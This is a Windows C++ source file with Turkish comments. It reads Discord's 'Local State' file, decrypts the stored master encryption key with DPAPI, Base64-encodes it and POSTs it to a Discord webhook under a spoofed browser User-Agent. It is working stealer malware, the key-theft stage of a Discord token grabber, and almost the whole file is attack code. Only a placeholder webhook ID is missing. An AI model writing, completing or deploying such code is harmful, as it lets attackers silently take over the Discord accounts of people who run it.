#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winhttp.h>
#include <dpapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <cstdlib>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

static std::wstring Utf8OrAcpToWide(const std::string& s) {
	if (s.empty())
		return L"";
	int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
	int cp = CP_UTF8;
	if (n <= 0) {
		cp = CP_ACP;
		n = MultiByteToWideChar(cp, 0, s.c_str(), -1, nullptr, 0);
	}
	if (n <= 0)
		return L"";
	std::wstring w(static_cast<size_t>(n - 1), L'\0');
	MultiByteToWideChar(cp, 0, s.c_str(), -1, w.data(), n);
	return w;
}

std::string DecryptMaster(std::vector<unsigned char> encryptedKey) {
	DATA_BLOB input;
	DATA_BLOB output;

	input.pbData = encryptedKey.data();
	input.cbData = (DWORD)encryptedKey.size();

	if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
		std::string decryptedKey((char*)output.pbData, output.cbData);
		LocalFree(output.pbData);
		return decryptedKey;
	}
	return "";
}

// Ham (binary) veriyi JSON icin guvenli ASCII yapar; Discord UTF-8 JSON reddederse kullan
static std::string Base64Encode(const std::string& raw) {
	if (raw.empty())
		return "";
	const BYTE* pb = reinterpret_cast<const BYTE*>(raw.data());
	DWORD cb = (DWORD)raw.size();
	DWORD cch = 0;
	if (!CryptBinaryToStringA(pb, cb, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &cch))
		return "";
	std::vector<char> buf((size_t)cch);
	if (!CryptBinaryToStringA(pb, cb, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buf.data(), &cch))
		return "";
	size_t len = (size_t)cch;
	if (len > 0 && buf[len - 1] == '\0')
		len--;
	return std::string(buf.data(), len);
}

bool SendToWebhook(const std::string& url, const std::string& content) {
	const std::wstring wurl = Utf8OrAcpToWide(url);
	if (wurl.empty())
		return false;

	URL_COMPONENTS uc = {};
	uc.dwStructSize = sizeof(uc);
	wchar_t host[256] = {};
	wchar_t path[2048] = {};
	uc.lpszHostName = host;
	uc.dwHostNameLength = ARRAYSIZE(host);
	uc.lpszUrlPath = path;
	uc.dwUrlPathLength = ARRAYSIZE(path);

	if (!WinHttpCrackUrl(wurl.c_str(), static_cast<DWORD>(wurl.length()), 0, &uc))
		return false;

	const std::string b64 = Base64Encode(content);
	const std::string json = std::string("{\"content\": \"**Cozulen Veri (Base64):** ") + b64 + "\"}";

	HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (!hSession)
		return false;

	INTERNET_PORT port = uc.nPort;
	if (port == 0)
		port = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? INTERNET_DEFAULT_HTTPS_PORT
													  : INTERNET_DEFAULT_HTTP_PORT;

	HINTERNET hConnect = WinHttpConnect(hSession, uc.lpszHostName, port, 0);
	if (!hConnect) {
		WinHttpCloseHandle(hSession);
		return false;
	}

	const DWORD openFlags =
		(uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
	HINTERNET hRequest = WinHttpOpenRequest(
		hConnect, L"POST", uc.lpszUrlPath, NULL, WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES, openFlags);
	if (!hRequest) {
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return false;
	}

	const wchar_t* headers = L"Content-Type: application/json; charset=utf-8\r\n";
	BOOL ok = WinHttpSendRequest(hRequest, headers, -1, (LPVOID)json.data(),
		(DWORD)json.size(), (DWORD)json.size(), 0);
	if (ok)
		ok = WinHttpReceiveResponse(hRequest, NULL);

	DWORD statusCode = 0;
	DWORD scSize = sizeof(statusCode);
	if (ok) {
		ok = WinHttpQueryHeaders(hRequest,
			WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
			NULL, &statusCode, &scSize, WINHTTP_NO_HEADER_INDEX);
	}

	std::string responseBody;
	if (ok) {
		for (;;) {
			DWORD avail = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &avail) || avail == 0)
				break;
			std::vector<char> chunk((size_t)avail + 1, 0);
			DWORD read = 0;
			if (!WinHttpReadData(hRequest, chunk.data(), avail, &read))
				break;
			responseBody.append(chunk.data(), read);
		}
	}

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

	if (!ok) {
		std::cerr << "WinHTTP: yanit veya durum kodu alinamadi" << std::endl;
		return false;
	}

	// Discord webhook basarisi: genelde 204 No Content
	if (statusCode < 200 || statusCode >= 300) {
		std::cerr << "Discord HTTP " << statusCode;
		if (!responseBody.empty())
			std::cerr << " — " << responseBody;
		std::cerr << std::endl;
		if (statusCode == 401 || statusCode == 404)
			std::cerr << "(Webhook silinmis, iptal edilmis veya URL yanlis.)" << std::endl;
		return false;
	}

	return true;
}

std::vector<unsigned char> Base64Decode(const std::string& input) {
	DWORD dwLen = 0;
	CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL);

	std::vector<unsigned char> buffer(dwLen);

	if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, buffer.data(), &dwLen, NULL, NULL)) {
		return buffer;
	}

	return {};
}

int main() {
	
	// dosya yolunu al
	
	char* appdata = std::getenv("APPDATA");
	if (!appdata) { return 1; }
	std::string path = std::string(appdata) + "\\discord\\Local State";

	std::ifstream file(path);

	if (!file.is_open()) {
		std::cerr << "Discord ayar dosyasi bulunamadi" << std::endl;
		return 1;
	}

	std::stringstream buffer;
	buffer << file.rdbuf();
	std::string content = buffer.str();

	// anahtari bulma (string arama)
	size_t pos = content.find("encrypted_key\":\"");
	if (pos == std::string::npos) {
		std::cerr << "Anahtar dosyasi icinde bulunamadi" << std::endl;
		return 1;
	}

	std::string encoded_key = content.substr(pos + 16);
	encoded_key = encoded_key.substr(0, encoded_key.find("\""));

	std::cout << "Sifreli anahtar bulundu (Base64)" << encoded_key << std::endl;

	std::vector<unsigned char> decodedBytes = Base64Decode(encoded_key);

	if (decodedBytes.empty()) {
		std::cerr << "Base64 cozme basarisiz" << std::endl;
		return 1;
	}

	std::vector<unsigned char> actualEncryptedKey;
	if (decodedBytes.size() > 5) {
		actualEncryptedKey.assign(decodedBytes.begin() + 5, decodedBytes.end());
	}
	else {
		std::cerr << "Gecersiz anahtar formati" << std::endl;
		return 1;
	}

	std::string masterKey = DecryptMaster(actualEncryptedKey);

	if (!masterKey.empty()) {
		std::cout << "Anahtar basariyla cozuldu, Webhook'a gonderiliyor..." << std::endl;

		std::string myWebhook = "https://discord.com/api/webhooks/YOUR_WEBHOOKID";

		if (SendToWebhook(myWebhook, masterKey)) {
			std::cout << "Webhook basariyla gonderildi" << std::endl;
		}
		else {
			std::cerr << "Webhook gonderim basarisiz" << std::endl;
		}
	}
	else {
		std::cerr << "Sifre cozme basarisiz (CryptUnprotectData) hatasi" << std::endl;
	}

	std::cout << "Kapatmak icin entere basin ... " << std::endl;
	std::cin.get();
	return 0;

}
